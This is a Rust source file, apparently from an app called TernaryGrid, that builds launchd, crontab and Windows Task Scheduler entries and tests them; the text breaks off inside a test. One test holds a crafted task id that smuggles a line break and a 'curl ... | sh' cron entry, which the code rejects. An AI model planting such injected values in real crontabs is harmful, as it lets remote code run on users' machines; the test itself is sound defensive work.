//! Operating system scheduler integration, so that tasks the user marked
//! with [`TaskDef::os_scheduler`] run while TernaryGrid is closed. Each entry runs
//! `<exe> --run-task <task id>`.
//!
//! * macOS: a launchd agent `dev.ternarygrid.task.<id>.plist` in
//!   `~/Library/LaunchAgents` ([`install_launch_agent`], then
//!   [`launchctl_load`] to activate it without logging out),
//! * Linux: a crontab line ([`crontab_with_task`] merges it into the text of
//!   `crontab -l`, to be written back with `crontab -`),
//! * Windows: a `schtasks` command line ([`schtasks_create`]).
//!
//! Functions never execute anything: the application runs the returned
//! [`OsCommand`]s. Installation functions take the target directory as a
//! parameter.
//!
//! Limitations: the OS schedulers have minute precision (cron seconds must
//! be 0); a [`Schedule::Once`] entry repeats every year on that date, so
//! the application should remove it after the run; Windows only supports
//! interval, daily / weekly and simple cron schedules.

use crate::model::TaskDef;
use crate::schedule::{CompiledCron, Schedule, compile_cron, parse_time_of_day};
use chrono::{Datelike, Timelike};
use cron::TimeUnitSpec;
use std::collections::BTreeSet;
use std::path::{Path, PathBuf};
use ternarygrid_core::{DbError, DbResult, tr, trf};

/// A command line for the application to execute.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct OsCommand {
    /// Program to run.
    pub program: String,
    /// Arguments (passed without a shell).
    pub args: Vec<String>,
}

impl OsCommand {
    /// Command line for display.
    pub fn display(&self) -> String {
        let mut s = self.program.clone();
        for a in &self.args {
            s.push(' ');
            if a.contains([' ', '"']) {
                s.push_str(&format!("\"{}\"", a.replace('"', "\\\"")));
            } else {
                s.push_str(a);
            }
        }
        s
    }
}

/// One firing rule; `None` fields are wildcards.
#[derive(Debug, Clone, Default, PartialEq, Eq, PartialOrd, Ord)]
struct CalendarEntry {
    month: Option<u32>,
    day: Option<u32>,
    /// 0 = Sunday ... 6 = Saturday
    weekday: Option<u32>,
    hour: Option<u32>,
    minute: Option<u32>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum OsSchedule {
    Calendar(Vec<CalendarEntry>),
    Interval(u64),
}

const MAX_CALENDAR_ENTRIES: usize = 2000;

fn unsupported(msg: String) -> DbError {
    DbError::unsupported(msg)
}

fn field(spec: &impl TimeUnitSpec) -> Vec<Option<u32>> {
    if spec.is_all() { vec![None] } else { spec.iter().map(Some).collect() }
}

fn cron_entries(c: &CompiledCron) -> DbResult<Vec<CalendarEntry>> {
    let mut out = BTreeSet::new();
    for s in std::iter::once(&c.primary).chain(c.alternate.iter()) {
        let seconds: Vec<u32> = s.seconds().iter().collect();
        if seconds != vec![0] {
            return Err(unsupported(tr("The operating system scheduler has minute precision: use 0 seconds").to_string()));
        }
        if !s.years().is_all() {
            return Err(unsupported(tr("The operating system scheduler cannot restrict years").to_string()));
        }
        if !s.days_of_month().is_all() && !s.days_of_week().is_all() {
            return Err(unsupported(tr("Schedules restricting both the day of month and the day of week are not supported by the operating system scheduler").to_string()));
        }
        let minutes = field(s.minutes());
        let hours = field(s.hours());
        let days = field(s.days_of_month());
        let months = field(s.months());
        // cron crate: 1 = Sunday ... 7 = Saturday
        let weekdays: Vec<Option<u32>> = field(s.days_of_week()).into_iter().map(|d| d.map(|d| (d + 6) % 7)).collect();
        let total = minutes.len() * hours.len() * days.len() * months.len() * weekdays.len();
        if out.len() + total > MAX_CALENDAR_ENTRIES {
            return Err(unsupported(tr("The schedule is too complex for the operating system scheduler").to_string()));
        }
        for &month in &months {
            for &day in &days {
                for &weekday in &weekdays {
                    for &hour in &hours {
                        for &minute in &minutes {
                            out.insert(CalendarEntry { month, day, weekday, hour, minute });
                        }
                    }
                }
            }
        }
    }
    Ok(out.into_iter().collect())
}

fn os_schedule(schedule: &Schedule) -> DbResult<OsSchedule> {
    schedule.validate().map_err(|e| DbError::config(e.to_string()))?;
    match schedule {
        Schedule::Cron(expr) => Ok(OsSchedule::Calendar(cron_entries(&compile_cron(expr).map_err(|e| DbError::config(e.to_string()))?)?)),
        Schedule::Interval { every_secs } => Ok(OsSchedule::Interval(*every_secs)),
        Schedule::Daily { at, weekdays } => {
            let t = parse_time_of_day(at).map_err(|e| DbError::config(e.to_string()))?;
            let days: BTreeSet<u32> = weekdays.iter().map(|d| u32::from(*d) % 7).collect();
            let base = CalendarEntry { hour: Some(t.hour()), minute: Some(t.minute()), ..Default::default() };
            if days.is_empty() || days.len() == 7 {
                Ok(OsSchedule::Calendar(vec![base]))
            } else {
                Ok(OsSchedule::Calendar(days.into_iter().map(|d| CalendarEntry { weekday: Some(d), ..base.clone() }).collect()))
            }
        }
        Schedule::Once { at } => {
            Ok(OsSchedule::Calendar(vec![CalendarEntry { month: Some(at.month()), day: Some(at.day()), weekday: None, hour: Some(at.hour()), minute: Some(at.minute()) }]))
        }
    }
}

fn require_schedule(task: &TaskDef) -> DbResult<&Schedule> {
    task.schedule.as_ref().ok_or_else(|| DbError::config(trf("The task {} has no schedule", &[&task.name])))
}

fn sanitize(id: &str) -> String {
    id.chars().map(|c| if c.is_ascii_alphanumeric() || "-_.".contains(c) { c } else { '_' }).collect()
}

fn xml(s: &str) -> String {
    s.replace('&', "&amp;").replace('<', "&lt;").replace('>', "&gt;").replace('"', "&quot;")
}

// ---------------------------------------------------------------- launchd

/// launchd label of a task.
pub fn launchd_label(task_id: &str) -> String {
    format!("dev.ternarygrid.task.{}", sanitize(task_id))
}

/// Path of a task's launch agent inside `dir`.
pub fn launch_agent_file(dir: &Path, task_id: &str) -> PathBuf {
    dir.join(format!("{}.plist", launchd_label(task_id)))
}

/// `~/Library/LaunchAgents` of the current user.
pub fn default_launch_agents_dir() -> Option<PathBuf> {
    std::env::var_os("HOME").map(|h| PathBuf::from(h).join("Library").join("LaunchAgents"))
}

/// launchd property list running `exe --run-task <id>` on the task's schedule.
pub fn launchd_plist(task: &TaskDef, exe: &Path) -> DbResult<String> {
    let schedule = os_schedule(require_schedule(task)?)?;
    let mut s = String::new();
    s.push_str("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
    s.push_str("<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n");
    s.push_str("<plist version=\"1.0\">\n<dict>\n");
    s.push_str(&format!("    <key>Label</key>\n    <string>{}</string>\n", xml(&launchd_label(&task.id))));
    s.push_str("    <key>ProgramArguments</key>\n    <array>\n");
    for a in [exe.to_string_lossy().to_string(), "--run-task".to_string(), task.id.clone()] {
        s.push_str(&format!("        <string>{}</string>\n", xml(&a)));
    }
    s.push_str("    </array>\n");
    match schedule {
        OsSchedule::Interval(secs) => s.push_str(&format!("    <key>StartInterval</key>\n    <integer>{secs}</integer>\n")),
        OsSchedule::Calendar(entries) => {
            s.push_str("    <key>StartCalendarInterval</key>\n    <array>\n");
            for e in entries {
                s.push_str("        <dict>\n");
                for (key, v) in [("Month", e.month), ("Day", e.day), ("Weekday", e.weekday), ("Hour", e.hour), ("Minute", e.minute)] {
                    if let Some(v) = v {
                        s.push_str(&format!("            <key>{key}</key>\n            <integer>{v}</integer>\n"));
                    }
                }
                s.push_str("        </dict>\n");
            }
            s.push_str("    </array>\n");
        }
    }
    s.push_str("    <key>RunAtLoad</key>\n    <false/>\n");
    s.push_str("    <key>ProcessType</key>\n    <string>Background</string>\n");
    s.push_str("</dict>\n</plist>\n");
    Ok(s)
}

/// Write the task's launch agent into `dir` (normally
/// [`default_launch_agents_dir`]). Returns the file path; activate it with
/// [`launchctl_load`].
pub fn install_launch_agent(task: &TaskDef, exe: &Path, dir: &Path) -> DbResult<PathBuf> {
    let plist = launchd_plist(task, exe)?;
    std::fs::create_dir_all(dir).map_err(|e| DbError::io(format!("{}: {e}", dir.display())))?;
    let path = launch_agent_file(dir, &task.id);
    std::fs::write(&path, plist).map_err(|e| DbError::io(format!("{}: {e}", path.display())))?;
    Ok(path)
}

/// Remove the task's launch agent from `dir` (deactivate it first with
/// [`launchctl_unload`]). Returns false when there was none.
pub fn uninstall_launch_agent(task_id: &str, dir: &Path) -> DbResult<bool> {
    let path = launch_agent_file(dir, task_id);
    match std::fs::remove_file(&path) {
        Ok(()) => Ok(true),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(false),
        Err(e) => Err(DbError::io(format!("{}: {e}", path.display()))),
    }
}

/// `launchctl load -w <plist>`.
pub fn launchctl_load(plist: &Path) -> OsCommand {
    OsCommand { program: "launchctl".into(), args: vec!["load".into(), "-w".into(), plist.to_string_lossy().to_string()] }
}

/// `launchctl unload -w <plist>`.
pub fn launchctl_unload(plist: &Path) -> OsCommand {
    OsCommand { program: "launchctl".into(), args: vec!["unload".into(), "-w".into(), plist.to_string_lossy().to_string()] }
}

// ---------------------------------------------------------------- crontab

fn crontab_marker(task_id: &str) -> String {
    format!("# ternarygrid-task:{}", sanitize(task_id))
}

fn shell_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

fn list(values: &BTreeSet<u32>) -> String {
    values.iter().map(|v| v.to_string()).collect::<Vec<_>>().join(",")
}

fn render(all: bool, values: impl Iterator<Item = u32>) -> String {
    if all { "*".into() } else { list(&values.collect()) }
}

/// 5-field crontab rendering of a 6/7-field (Quartz style) expression.
fn cron_fields_5(c: &CompiledCron) -> DbResult<String> {
    cron_entries(c)?; // rejects seconds, years and day-of-month AND day-of-week
    let s = &c.primary;
    Ok(format!(
        "{} {} {} {} {}",
        render(s.minutes().is_all(), s.minutes().iter()),
        render(s.hours().is_all(), s.hours().iter()),
        render(s.days_of_month().is_all(), s.days_of_month().iter()),
        render(s.months().is_all(), s.months().iter()),
        render(s.days_of_week().is_all(), s.days_of_week().iter().map(|d| (d + 6) % 7)),
    ))
}

fn crontab_schedule(schedule: &Schedule) -> DbResult<String> {
    schedule.validate().map_err(|e| DbError::config(e.to_string()))?;
    match schedule {
        Schedule::Cron(expr) => {
            let c = compile_cron(expr).map_err(|e| DbError::config(e.to_string()))?;
            if c.unix { Ok(expr.split_whitespace().collect::<Vec<_>>().join(" ")) } else { cron_fields_5(&c) }
        }
        Schedule::Interval { every_secs } => {
            let s = *every_secs;
            if s % 60 == 0 && 60 % (s / 60).max(1) == 0 && s < 3600 {
                Ok(if s == 60 { "* * * * *".into() } else { format!("*/{} * * * *", s / 60) })
            } else if s % 3600 == 0 && 24 % (s / 3600).max(1) == 0 && s < 86_400 {
                Ok(if s == 3600 { "0 * * * *".into() } else { format!("0 */{} * * *", s / 3600) })
            } else if s == 86_400 {
                Ok("0 0 * * *".into())
            } else {
                Err(unsupported(trf("An interval of {} s cannot be expressed in crontab", &[&s])))
            }
        }
        Schedule::Daily { at, weekdays } => {
            let t = parse_time_of_day(at).map_err(|e| DbError::config(e.to_string()))?;
            let days: BTreeSet<u32> = weekdays.iter().map(|d| u32::from(*d) % 7).collect();
            let dow = if days.is_empty() || days.len() == 7 { "*".to_string() } else { list(&days) };
            Ok(format!("{} {} * * {dow}", t.minute(), t.hour()))
        }
        Schedule::Once { at } => Ok(format!("{} {} {} {} *", at.minute(), at.hour(), at.day(), at.month())),
    }
}

/// crontab line running `exe --run-task <id>` on the task's schedule, ending
/// with a `# ternarygrid-task:<id>` marker.
pub fn crontab_line(task: &TaskDef, exe: &Path) -> DbResult<String> {
    // A line break in the id or the path would start another crontab entry.
    if task.id.chars().chain(exe.to_string_lossy().chars()).any(char::is_control) {
        return Err(DbError::config("The task id or the program path contains a control character"));
    }
    let when = crontab_schedule(require_schedule(task)?)?;
    // `%` is a newline in crontab commands
    let command = format!("{} --run-task {}", shell_quote(&exe.to_string_lossy()), shell_quote(&task.id)).replace('%', "\\%");
    Ok(format!("{when} {command} {}", crontab_marker(&task.id)))
}

/// `existing` crontab text with the task's line added or replaced.
pub fn crontab_with_task(existing: &str, task: &TaskDef, exe: &Path) -> DbResult<String> {
    let line = crontab_line(task, exe)?;
    let mut out = crontab_without_task(existing, &task.id);
    if !out.is_empty() && !out.ends_with('\n') {
        out.push('\n');
    }
    out.push_str(&line);
    out.push('\n');
    Ok(out)
}

/// `existing` crontab text without the task's line.
pub fn crontab_without_task(existing: &str, task_id: &str) -> String {
    let marker = crontab_marker(task_id);
    existing.lines().filter(|l| !l.trim_end().ends_with(&marker)).map(|l| format!("{l}\n")).collect()
}

// ---------------------------------------------------------------- Windows

/// Windows Task Scheduler name of a task.
pub fn schtasks_task_name(task_id: &str) -> String {
    format!("TernaryGrid\\task-{}", sanitize(task_id))
}

const WIN_DAYS: [&str; 7] = ["SUN", "MON", "TUE", "WED", "THU", "FRI", "SAT"];
const WIN_XML_DAYS: [&str; 7] = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];

fn validate_schtasks_inputs(task_id: &str, exe: &Path) -> DbResult<String> {
    let exe_str = exe.to_string_lossy();
    if exe_str.is_empty() {
        return Err(DbError::config("The program path is empty"));
    }
    if task_id.chars().chain(exe_str.chars()).any(char::is_control) {
        return Err(DbError::config("The task id or the program path contains a control character"));
    }
    if exe_str.contains('"') {
        return Err(DbError::config("The program path must not contain double quotes"));
    }
    if exe_str.ends_with('\\') {
        return Err(DbError::config("The program path must not end with a backslash"));
    }
    Ok(exe_str.into_owned())
}

/// Quotes an argument for Windows `CommandLineToArgvW` / `schtasks /TR`.
fn windows_quote_arg(s: &str) -> String {
    if !s.is_empty() && sanitize(s) == s {
        return s.to_string();
    }
    let mut out = String::with_capacity(s.len() + 2);
    out.push('"');
    let mut backslashes = 0usize;
    for c in s.chars() {
        match c {
            '\\' => backslashes += 1,
            '"' => {
                for _ in 0..(backslashes * 2 + 1) {
                    out.push('\\');
                }
                out.push('"');
                backslashes = 0;
            }
            _ => {
                for _ in 0..backslashes {
                    out.push('\\');
                }
                backslashes = 0;
                out.push(c);
            }
        }
    }
    for _ in 0..(backslashes * 2) {
        out.push('\\');
    }
    out.push('"');
    out
}

fn schtasks_schedule(schedule: &Schedule) -> DbResult<Vec<String>> {
    schedule.validate().map_err(|e| DbError::config(e.to_string()))?;
    let a = |v: &[&str]| v.iter().map(|s| s.to_string()).collect::<Vec<_>>();
    match schedule {
        Schedule::Interval { every_secs } => {
            let s = *every_secs;
            if s % 86_400 == 0 {
                Ok(a(&["/SC", "DAILY", "/MO", &(s / 86_400).to_string(), "/ST", "00:00"]))
            } else if s % 3600 == 0 && s / 3600 <= 23 {
                Ok(a(&["/SC", "HOURLY", "/MO", &(s / 3600).to_string()]))
            } else if s % 60 == 0 && s / 60 <= 1439 {
                Ok(a(&["/SC", "MINUTE", "/MO", &(s / 60).to_string()]))
            } else {
                Err(unsupported(trf("An interval of {} s cannot be expressed in the Windows Task Scheduler", &[&s])))
            }
        }
        Schedule::Daily { at, weekdays } => {
            let t = parse_time_of_day(at).map_err(|e| DbError::config(e.to_string()))?;
            let st = format!("{:02}:{:02}", t.hour(), t.minute());
            let days: BTreeSet<usize> = weekdays.iter().map(|d| usize::from(*d) % 7).collect();
            if days.is_empty() || days.len() == 7 {
                Ok(a(&["/SC", "DAILY", "/ST", &st]))
            } else {
                let d = days.iter().map(|d| WIN_DAYS[*d]).collect::<Vec<_>>().join(",");
                Ok(a(&["/SC", "WEEKLY", "/D", &d, "/ST", &st]))
            }
        }
        Schedule::Once { .. } => {
            // `/SD` parses dates according to the active Windows locale (MM/DD/YYYY vs
            // DD/MM/YYYY vs YYYY/MM/DD), so a hardcoded date format silently schedules
            // the wrong date or fails on non-US systems. Use `schtasks_xml` +
            // `schtasks_create_from_xml` (ISO-8601 `<StartBoundary>`) instead.
            Err(unsupported(tr("One-time schedules require XML registration in the Windows Task Scheduler (schtasks /XML) because /SD is locale-dependent").to_string()))
        }
        Schedule::Cron(expr) => {
            let f: Vec<&str> = expr.split_whitespace().collect();
            let num = |s: &str| s.parse::<u32>().ok();
            match f.as_slice() {
                [m, "*", "*", "*", "*"] if m.starts_with("*/") => {
                    let n = num(&m[2..]).ok_or_else(|| unsupported(tr("This cron expression is too complex for the Windows Task Scheduler").to_string()))?;
                    Ok(a(&["/SC", "MINUTE", "/MO", &n.to_string()]))
                }
                ["0", h, "*", "*", "*"] if h.starts_with("*/") => {
                    let n = num(&h[2..]).ok_or_else(|| unsupported(tr("This cron expression is too complex for the Windows Task Scheduler").to_string()))?;
                    Ok(a(&["/SC", "HOURLY", "/MO", &n.to_string()]))
                }
                [m, h, "*", "*", dow] if num(m).is_some() && num(h).is_some() => {
                    let daily = Schedule::Daily { at: format!("{}:{}", h, m), weekdays: Vec::new() };
                    if *dow == "*" {
                        schtasks_schedule(&daily)
                    } else {
                        let c = compile_cron(expr).map_err(|e| DbError::config(e.to_string()))?;
                        let days: Vec<u8> = c.primary.days_of_week().iter().map(|d| ((d + 6) % 7) as u8).collect();
                        schtasks_schedule(&Schedule::Daily { at: format!("{}:{}", h, m), weekdays: days.into_iter().map(|d| if d == 0 { 7 } else { d }).collect() })
                    }
                }
                _ => Err(unsupported(tr("This cron expression is too complex for the Windows Task Scheduler; use an interval or a daily schedule").to_string())),
            }
        }
    }
}

fn schtasks_xml_trigger(schedule: &Schedule) -> DbResult<String> {
    schedule.validate().map_err(|e| DbError::config(e.to_string()))?;
    match schedule {
        Schedule::Once { at } => {
            Ok(format!("    <TimeTrigger>\n      <StartBoundary>{}</StartBoundary>\n      <Enabled>true</Enabled>\n    </TimeTrigger>\n", at.format("%Y-%m-%dT%H:%M:%S")))
        }
        Schedule::Interval { every_secs } => {
            let s = *every_secs;
            if s % 86_400 == 0 {
                Ok(format!(
                    "    <CalendarTrigger>\n      <StartBoundary>2000-01-01T00:00:00</StartBoundary>\n      <Enabled>true</Enabled>\n      <ScheduleByDay>\n        <DaysInterval>{}</DaysInterval>\n      </ScheduleByDay>\n    </CalendarTrigger>\n",
                    s / 86_400
                ))
            } else if s % 3600 == 0 && s / 3600 <= 23 {
                Ok(format!(
                    "    <CalendarTrigger>\n      <Repetition>\n        <Interval>PT{}H</Interval>\n        <StopAtDurationEnd>false</StopAtDurationEnd>\n      </Repetition>\n      <StartBoundary>2000-01-01T00:00:00</StartBoundary>\n      <Enabled>true</Enabled>\n      <ScheduleByDay>\n        <DaysInterval>1</DaysInterval>\n      </ScheduleByDay>\n    </CalendarTrigger>\n",
                    s / 3600
                ))
            } else if s % 60 == 0 && s / 60 <= 1439 {
                Ok(format!(
                    "    <CalendarTrigger>\n      <Repetition>\n        <Interval>PT{}M</Interval>\n        <StopAtDurationEnd>false</StopAtDurationEnd>\n      </Repetition>\n      <StartBoundary>2000-01-01T00:00:00</StartBoundary>\n      <Enabled>true</Enabled>\n      <ScheduleByDay>\n        <DaysInterval>1</DaysInterval>\n      </ScheduleByDay>\n    </CalendarTrigger>\n",
                    s / 60
                ))
            } else {
                Err(unsupported(trf("An interval of {} s cannot be expressed in the Windows Task Scheduler", &[&s])))
            }
        }
        Schedule::Daily { at, weekdays } => {
            let t = parse_time_of_day(at).map_err(|e| DbError::config(e.to_string()))?;
            let start = format!("2000-01-01T{:02}:{:02}:00", t.hour(), t.minute());
            let days: BTreeSet<usize> = weekdays.iter().map(|d| usize::from(*d) % 7).collect();
            if days.is_empty() || days.len() == 7 {
                Ok(format!(
                    "    <CalendarTrigger>\n      <StartBoundary>{start}</StartBoundary>\n      <Enabled>true</Enabled>\n      <ScheduleByDay>\n        <DaysInterval>1</DaysInterval>\n      </ScheduleByDay>\n    </CalendarTrigger>\n"
                ))
            } else {
                let mut d = String::new();
                for day in days {
                    d.push_str(&format!("          <{}/>\n", WIN_XML_DAYS[day]));
                }
                Ok(format!(
                    "    <CalendarTrigger>\n      <StartBoundary>{start}</StartBoundary>\n      <Enabled>true</Enabled>\n      <ScheduleByWeek>\n        <WeeksInterval>1</WeeksInterval>\n        <DaysOfWeek>\n{d}        </DaysOfWeek>\n      </ScheduleByWeek>\n    </CalendarTrigger>\n"
                ))
            }
        }
        Schedule::Cron(expr) => {
            let f: Vec<&str> = expr.split_whitespace().collect();
            let num = |s: &str| s.parse::<u32>().ok();
            match f.as_slice() {
                [m, "*", "*", "*", "*"] if m.starts_with("*/") => {
                    let n = num(&m[2..]).ok_or_else(|| unsupported(tr("This cron expression is too complex for the Windows Task Scheduler").to_string()))?;
                    schtasks_xml_trigger(&Schedule::Interval { every_secs: u64::from(n) * 60 })
                }
                ["0", h, "*", "*", "*"] if h.starts_with("*/") => {
                    let n = num(&h[2..]).ok_or_else(|| unsupported(tr("This cron expression is too complex for the Windows Task Scheduler").to_string()))?;
                    schtasks_xml_trigger(&Schedule::Interval { every_secs: u64::from(n) * 3600 })
                }
                [m, h, "*", "*", dow] if num(m).is_some() && num(h).is_some() => {
                    if *dow == "*" {
                        schtasks_xml_trigger(&Schedule::Daily { at: format!("{h}:{m}"), weekdays: Vec::new() })
                    } else {
                        let c = compile_cron(expr).map_err(|e| DbError::config(e.to_string()))?;
                        let days: Vec<u8> = c.primary.days_of_week().iter().map(|d| ((d + 6) % 7) as u8).collect();
                        schtasks_xml_trigger(&Schedule::Daily { at: format!("{h}:{m}"), weekdays: days.into_iter().map(|d| if d == 0 { 7 } else { d }).collect() })
                    }
                }
                _ => Err(unsupported(tr("This cron expression is too complex for the Windows Task Scheduler; use an interval or a daily schedule").to_string())),
            }
        }
    }
}

/// Locale-independent Windows Task Scheduler 1.2 XML for registering `task`
/// via `schtasks /Create /F /TN <name> /XML <file>` ([`schtasks_create_from_xml`]).
///
/// Uses ISO-8601 `<StartBoundary>YYYY-MM-DDTHH:MM:SS</StartBoundary>` and
/// separate XML-escaped `<Command>` / `<Arguments>` elements.
pub fn schtasks_xml(task: &TaskDef, exe: &Path) -> DbResult<String> {
    let exe_str = validate_schtasks_inputs(&task.id, exe)?;
    let trigger = schtasks_xml_trigger(require_schedule(task)?)?;
    let args = format!("--run-task {}", windows_quote_arg(&task.id));
    Ok(format!(
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\
         <Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n\
         \x20 <RegistrationInfo>\n\
         \x20   <Description>{}</Description>\n\
         \x20 </RegistrationInfo>\n\
         \x20 <Triggers>\n\
         {trigger}\
         \x20 </Triggers>\n\
         \x20 <Settings>\n\
         \x20   <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n\
         \x20   <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n\
         \x20   <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n\
         \x20   <Enabled>true</Enabled>\n\
         \x20 </Settings>\n\
         \x20 <Actions Context=\"Author\">\n\
         \x20   <Exec>\n\
         \x20     <Command>{}</Command>\n\
         \x20     <Arguments>{}</Arguments>\n\
         \x20   </Exec>\n\
         \x20 </Actions>\n\
         </Task>\n",
        xml(&task.name),
        xml(&exe_str),
        xml(&args),
    ))
}

/// Path of a task's Windows Task Scheduler XML file inside `dir`.
pub fn windows_task_xml_file(dir: &Path, task_id: &str) -> PathBuf {
    dir.join(format!("task-{}.xml", sanitize(task_id)))
}

/// Write the task's Windows Task Scheduler XML into `dir` and return its path;
/// register it with [`schtasks_create_from_xml`].
pub fn install_windows_task_xml(task: &TaskDef, exe: &Path, dir: &Path) -> DbResult<PathBuf> {
    let content = schtasks_xml(task, exe)?;
    std::fs::create_dir_all(dir).map_err(|e| DbError::io(format!("{}: {e}", dir.display())))?;
    let path = windows_task_xml_file(dir, &task.id);
    std::fs::write(&path, content).map_err(|e| DbError::io(format!("{}: {e}", path.display())))?;
    Ok(path)
}

/// `schtasks /Create /F /TN <name> /XML <xml_file>` command registering a task
/// from a locale-independent XML definition produced by [`schtasks_xml`].
pub fn schtasks_create_from_xml(task_id: &str, xml_file: &Path) -> OsCommand {
    OsCommand {
        program: "schtasks".into(),
        args: vec!["/Create".into(), "/F".into(), "/TN".into(), schtasks_task_name(task_id), "/XML".into(), xml_file.to_string_lossy().to_string()],
    }
}

/// `schtasks /Create` command registering the task.
///
/// Rejects unsafe characters in `exe` or `task.id` (`"`, control characters,
/// or trailing `\`). One-time schedules (`Schedule::Once`) require
/// [`schtasks_xml`] + [`schtasks_create_from_xml`] because `/SD` is
/// locale-dependent on Windows.
pub fn schtasks_create(task: &TaskDef, exe: &Path) -> DbResult<OsCommand> {
    let exe_str = validate_schtasks_inputs(&task.id, exe)?;
    let sched = schtasks_schedule(require_schedule(task)?)?;
    let mut args = vec!["/Create".to_string(), "/F".to_string(), "/TN".to_string(), schtasks_task_name(&task.id), "/TR".to_string()];
    // The real id (quoted when needed): a sanitized one would not find the task.
    let id = windows_quote_arg(&task.id);
    args.push(format!("\"{exe_str}\" --run-task {id}"));
    args.extend(sched);
    Ok(OsCommand { program: "schtasks".into(), args })
}

/// `schtasks /Delete` command removing the task.
pub fn schtasks_delete(task_id: &str) -> OsCommand {
    OsCommand { program: "schtasks".into(), args: vec!["/Delete".into(), "/F".into(), "/TN".into(), schtasks_task_name(task_id)] }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::TaskKind;
    use chrono::{Local, TimeZone};

    fn task(schedule: Schedule) -> TaskDef {
        let mut t = TaskDef::new("Nightly <backup>", TaskKind::Shell { command: "x".into() }).with_schedule(schedule);
        t.id = "1234-abcd".into();
        t
    }

    fn exe() -> PathBuf {
        PathBuf::from("/Applications/TernaryGrid.app/Contents/MacOS/ternarygrid")
    }

    #[test]
    fn plist_for_cron_and_interval() {
        let p = launchd_plist(&task(Schedule::Cron("30 9 * * 1-5".into())), &exe()).unwrap();
        assert!(p.contains("<string>dev.ternarygrid.task.1234-abcd</string>"));
        assert!(p.contains("<string>/Applications/TernaryGrid.app/Contents/MacOS/ternarygrid</string>\n        <string>--run-task</string>\n        <string>1234-abcd</string>"));
        assert_eq!(p.matches("<key>Weekday</key>").count(), 5);
        assert_eq!(p.matches("<key>Hour</key>\n            <integer>9</integer>").count(), 5);
        assert!(!p.contains("StartInterval"));
        let p = launchd_plist(&task(Schedule::Interval { every_secs: 900 }), &exe()).unwrap();
        assert!(p.contains("<key>StartInterval</key>\n    <integer>900</integer>"));
        // OR of day of month and weekday becomes separate entries
        let p = launchd_plist(&task(Schedule::Cron("0 0 13 * 5".into())), &exe()).unwrap();
        assert_eq!(p.matches("<key>Day</key>").count(), 1);
        assert_eq!(p.matches("<key>Weekday</key>\n            <integer>5</integer>").count(), 1);
        // daily with weekdays: launchd 0 = Sunday
        let p = launchd_plist(&task(Schedule::Daily { at: "07:15".into(), weekdays: vec![7, 1] }), &exe()).unwrap();
        assert!(p.contains("<key>Weekday</key>\n            <integer>0</integer>"));
        assert!(p.contains("<key>Weekday</key>\n            <integer>1</integer>"));
        assert!(p.contains("<key>Minute</key>\n            <integer>15</integer>"));
        // unsupported
        assert!(launchd_plist(&task(Schedule::Cron("15 * * * * *".into())), &exe()).is_err());
        assert!(launchd_plist(&task(Schedule::Cron("0 0 0 13 * FRI".into())), &exe()).is_err());
        let mut no = task(Schedule::Interval { every_secs: 60 });
        no.schedule = None;
        assert!(launchd_plist(&no, &exe()).is_err());
    }

    #[test]
    fn plist_is_valid_xml_and_escaped() {
        let mut t = task(Schedule::Cron("@daily".into()));
        t.id = "a&b<c>".into();
        let p = launchd_plist(&t, Path::new("/tmp/my \"app\"/ternarygrid")).unwrap();
        assert!(p.contains("dev.ternarygrid.task.a_b_c_"));
        assert!(p.contains("a&amp;b&lt;c&gt;"));
        assert!(p.contains("/tmp/my &quot;app&quot;/ternarygrid"));
    }

    #[test]
    fn install_and_uninstall_in_a_temp_dir() {
        let dir = tempfile::tempdir().unwrap();
        let t = task(Schedule::Interval { every_secs: 3600 });
        let path = install_launch_agent(&t, &exe(), dir.path()).unwrap();
        assert_eq!(path, dir.path().join("dev.ternarygrid.task.1234-abcd.plist"));
        assert!(std::fs::read_to_string(&path).unwrap().contains("StartInterval"));
        assert_eq!(launchctl_load(&path).args[0], "load");
        assert!(launchctl_unload(&path).display().starts_with("launchctl unload -w"));
        assert!(uninstall_launch_agent(&t.id, dir.path()).unwrap());
        assert!(!uninstall_launch_agent(&t.id, dir.path()).unwrap());
    }

    #[test]
    fn crontab_lines() {
        let l = crontab_line(&task(Schedule::Cron("30  9 * *  1-5".into())), &exe()).unwrap();
        assert_eq!(l, "30 9 * * 1-5 '/Applications/TernaryGrid.app/Contents/MacOS/ternarygrid' --run-task '1234-abcd' # ternarygrid-task:1234-abcd");
        assert!(crontab_line(&task(Schedule::Cron("0 30 9 * * MON-FRI".into())), &exe()).unwrap().starts_with("30 9 * * 1,2,3,4,5 "));
        assert!(crontab_line(&task(Schedule::Interval { every_secs: 900 }), &exe()).unwrap().starts_with("*/15 * * * * "));
        assert!(crontab_line(&task(Schedule::Interval { every_secs: 7200 }), &exe()).unwrap().starts_with("0 */2 * * * "));
        assert!(crontab_line(&task(Schedule::Interval { every_secs: 7 * 60 }), &exe()).is_err());
        assert!(crontab_line(&task(Schedule::Daily { at: "06:05".into(), weekdays: vec![6, 7] }), &exe()).unwrap().starts_with("5 6 * * 0,6 "));
        let at = Local.with_ymd_and_hms(2030, 2, 3, 4, 5, 0).earliest().unwrap();
        assert!(crontab_line(&task(Schedule::Once { at }), &exe()).unwrap().starts_with("5 4 3 2 * "));
        let percent = crontab_line(&task(Schedule::Cron("@hourly".into())), Path::new("/opt/100%/ternarygrid")).unwrap();
        assert!(percent.contains("'/opt/100\\%/ternarygrid'"));
        let mut evil = task(Schedule::Cron("@hourly".into()));
        evil.id = "x\n* * * * * curl e/x|sh #".into();
        assert!(crontab_line(&evil, &exe()).is_err(), "a line break would add a cron entry");
        // merge into an existing crontab
        let existing = "MAILTO=me\n0 1 * * * backup.sh\n";
        let t = task(Schedule::Cron("@daily".into()));
        let merged = crontab_with_task(existing, &t, &exe()).unwrap();
        assert_eq!(merged.lines().count(), 3);
